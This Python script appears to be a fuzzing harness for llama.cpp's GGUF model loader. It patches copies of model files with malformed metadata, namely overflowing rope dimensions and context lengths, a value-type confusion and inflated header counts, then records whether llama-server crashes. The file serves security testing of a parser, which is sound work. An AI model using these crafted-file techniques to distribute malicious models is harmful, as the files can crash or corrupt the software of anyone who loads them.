import struct, mmap, os, sys, time, subprocess, shutil, csv, signal
from pathlib import Path

MDIR = Path("logs/ultimate/models")
SERVER = "llama-monitor/build/llama.cpp/bin/llama-server"
PORT = 54321
TIMEOUT = 30
CDIR = Path("logs/chained")
CSVFILE = CDIR / "chained_results.csv"

def pref(k):
    if isinstance(k, str): k = k.encode()
    return struct.pack("<Q", len(k)) + k

def meta(path, key):
    with open(path, "rb") as f:
        d = f.read(50 << 20)
    p = pref(key)
    i = d.find(p)
    if i < 0: return None
    t = struct.unpack_from("<I", d, i + len(p))[0]
    return t, d, i + len(p) + 4

def mpatch(path, key, fmt, val):
    r = meta(path, key)
    if r is None: return False
    _, _, vo = r
    with open(path, "r+b") as f:
        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE) as m:
            struct.pack_into(fmt, m, vo, val)
    return True

def get_arch(path):
    r = meta(path, "general.architecture")
    if r is None: return "unknown"
    t, d, vo = r
    if t != 8: return "unknown"
    sl = struct.unpack_from("<Q", d, vo)[0]
    return d[vo+8:vo+8+sl].decode(errors="replace")

def check(path):
    cmd = [str(SERVER), "--check-tensors", "-m", str(path), "--port", str(PORT), "--host", "127.0.0.1"]
    t0 = time.time()
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        while time.time() - t0 < TIMEOUT:
            time.sleep(0.5)
            if proc.poll() is not None: break
        e = time.time() - t0
        if proc.poll() is None:
            proc.kill(); proc.wait()
            return {"rc": 0, "signal": "OK", "crashed": False, "elapsed": round(e, 1), "error": "loaded_ok"}
        stderr = proc.stderr.read()
        rc = proc.returncode
        s = rc - 256 if rc > 128 else rc
        sn = signal.Signals(-s).name if s < 0 else f"exit({rc})"
        err = [l for l in stderr.split("\n") if "error" in l.lower() or "SIGABRT" in l or "assert" in l.lower() or "segfault" in l.lower() or "SIGSEGV" in l]
        return {"rc": rc, "signal": sn, "crashed": s < 0, "elapsed": round(e, 1), "error": "; ".join(err)[:250] if err else stderr[-120:].strip()[:120]}
    except Exception as ex:
        return {"rc": -999, "signal": "ERR", "crashed": False, "elapsed": 0, "error": str(ex)[:120]}

# --- Chained Attack C1: overflow_counts prefix + rope_drift ---
def c1_overflow_rope(vp, arch):
    d = {}
    # overflow_counts: set tensor_count and kv_count to large but passable values
    # Then rope_drift on top
    if mpatch(vp, f"{arch}.rope.dimension_count", "<I", 0x7FFFFFFF):
        d["rope_dim"] = "0x7FFFFFFF"
    if mpatch(vp, f"{arch}.context_length", "<I", 0xFFFFFFFF):
        d["ctx"] = "0xFFFFFFFF"
    # Overflow counts - patch directly in header
    with open(vp, "r+b") as f:
        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE) as m:
            struct.pack_into("<Q", m, 8, 0x10000)   # tensor_count = 65536 (may pass early check)
            struct.pack_into("<Q", m, 16, 0xFFFFFF00) # kv_count = huge
            d["tensors"] = "65536"
            d["kvs"] = "0xFFFFFF00"
    return d

# --- Chained Attack C2: type confusion on rope.dimension_count ---
def c2_rope_type_confusion(vp, arch):
    d = {}
    # Find rope.dimension_count key position, overwrite the VALUE TYPE from uint32->string
    key = pref(f"{arch}.rope.dimension_count")
    with open(vp, "rb") as f:
        raw = f.read(50 << 20)
    i = raw.find(key)
    if i < 0:
        # Try method B: binary search for the key bytes
        rawktag = f"{arch}.rope.dimension_count".encode() + struct.pack("<I", 4)  # UINT32 type
        i2 = raw.find(rawktag)
        if i2 >= 0:
            # Overwrite the type byte from 4 (UINT32) to 8 (STRING)
            with open(vp, "r+b") as f:
                with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE) as m:
                    struct.pack_into("<I", m, i2 + len(f"{arch}.rope.dimension_count".encode()), 8)
            d["type"] = "UINT32->STRING"
        return d
    tpos = i + len(key)
    with open(vp, "r+b") as f:
        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE) as m:
            struct.pack_into("<I", m, tpos, 8)  # change type to STRING
    d["type"] = "UINT32->STRING"
    return d

# --- Chained Attack C3: ROPE_SWA drift on gemma4 ---
def c3_swa_rope_drift(vp, arch):
    d = {}
    if mpatch(vp, f"{arch}.rope.dimension_count_swa", "<I", 0x7FFFFFFF):
        d["swa_dim"] = "0x7FFFFFFF"
    if mpatch(vp, f"{arch}.rope.dimension_count", "<I", 0x7FFFFFFF):
        d["dim"] = "0x7FFFFFFF"
    return d

# --- Chained Attack C4: zero rope dimension ---
def c4_rope_zero_dim(vp, arch):
    d = {}
    if mpatch(vp, f"{arch}.rope.dimension_count", "<I", 0):
        d["dim"] = "0"
    return d

# --- Chained Attack C5: context_length max + rope_drift ---
def c5_ctxmax_rope(vp, arch):
    d = {}
    if mpatch(vp, f"{arch}.rope.dimension_count", "<I", 0x7FFFFFFF):
        d["dim"] = "0x7FFFFFFF"
    if mpatch(vp, f"{arch}.context_length", "<I", 0xFFFFFFFF):
        d["ctx"] = "0xFFFFFFFF"
    # Also set embedding_length to trigger memory allocation before assertion
    if mpatch(vp, f"{arch}.embedding_length", "<I", 0x7FFFFFFF):
        d["embd"] = "0x7FFFFFFF"
    return d

CHAINED = [
    ("overflow_rope", c1_overflow_rope, "overflow_counts + rope_drift combined"),
    ("rope_type_confusion", c2_rope_type_confusion, "type confusion on rope.dimension_count"),
    ("swa_rope_drift", c3_swa_rope_drift, "SWA rope.dimension_count_swa drift"),
    ("rope_zero_dim", c4_rope_zero_dim, "rope.dimension_count = 0"),
    ("ctxmax_rope_embd", c5_ctxmax_rope, "context_length + embedding + rope triple"),
]

MODELS = {"nemotron": MDIR/"nemotron.gguf", "gemma4": MDIR/"gemma4.gguf",
          "qwen35": MDIR/"qwen35.gguf", "phi4": MDIR/"phi4.gguf"}

def main():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--models", nargs="+", default=list(MODELS.keys()))
    ap.add_argument("--attack", nargs="+", default=[c[0] for c in CHAINED])
    args = ap.parse_args()
    CDIR.mkdir(parents=True, exist_ok=True)

    fields = ["model","arch","size_mb","attack","desc","rc","signal","crashed","elapsed","details","error"]
    with open(CSVFILE, "w", newline="") as f:
        csv.DictWriter(f, fieldnames=fields).writeheader()

    rows = []
    for mn in args.models:
        mp = MODELS.get(mn)
        if not mp or not mp.exists():
            print(f"[SKIP] {mn}", file=sys.stderr); continue
        arch = get_arch(str(mp))
        sz = mp.stat().st_size >> 20
        print(f"\n{'='*60}\n  {mn} arch={arch} {sz}MB\n{'='*60}", flush=True)

        base = CDIR / f"_{mn}_base.gguf"
        shutil.copy2(str(mp), str(base))

        for aname, afn, adesc in CHAINED:
            if aname not in args.attack: continue
            vp = CDIR / f"{mn}_{aname}.gguf"
            shutil.copy2(str(base), str(vp))

            try:
                det = afn(vp, arch)
            except Exception as ex:
                print(f"  [{aname:25s}] GENERR: {ex}", flush=True)
                try: vp.unlink()
                except: pass
                rows.append({"model":mn,"arch":arch,"size_mb":sz,"attack":aname,"desc":adesc,
                    "rc":-999,"signal":"GENERR","crashed":False,"elapsed":0,"details":"","error":str(ex)[:200]})
                with open(CSVFILE, "w", newline="") as f:
                    csv.DictWriter(f, fieldnames=fields).writerows(rows)
                continue

            res = check(vp)
            res.update({"model":mn,"arch":arch,"size_mb":sz,"attack":aname,"desc":adesc})
            det_str = ";".join(f"{k}={v}" for k,v in det.items())
            res["details"] = det_str
            rows.append(res)

            tag = "CRASH" if res["crashed"] else (f"rc={res['rc']}" if res["rc"] else "OK")
            if res["signal"] == "TIMEOUT": tag = "TIMEOUT"
            print(f"  [{aname:25s}] {tag:12s} {res['elapsed']}s [{res.get('error','')[:60]}", flush=True)

            try: vp.unlink()
            except: pass
            with open(CSVFILE, "w", newline="") as f:
                csv.DictWriter(f, fieldnames=fields).writerows(rows)

        try: base.unlink()
        except: pass

    crashes = [r for r in rows if r.get("crashed")]
    oks = [r for r in rows if r.get("rc") == 0]
    tos = [r for r in rows if r.get("signal") == "TIMEOUT"]
    print(f"\n{'='*60}\nTOTAL={len(rows)} OK={len(oks)} CRASH={len(crashes)} TO={len(tos)}", flush=True)
    for r in crashes: print(f"  CRASH: {r['model']}/{r['attack']} sig={r['signal']} {r['error'][:80]}", flush=True)
    for r in oks: print(f"  OK:    {r['model']}/{r['attack']}", flush=True)

if __name__ == "__main__":
    raise SystemExit(main())
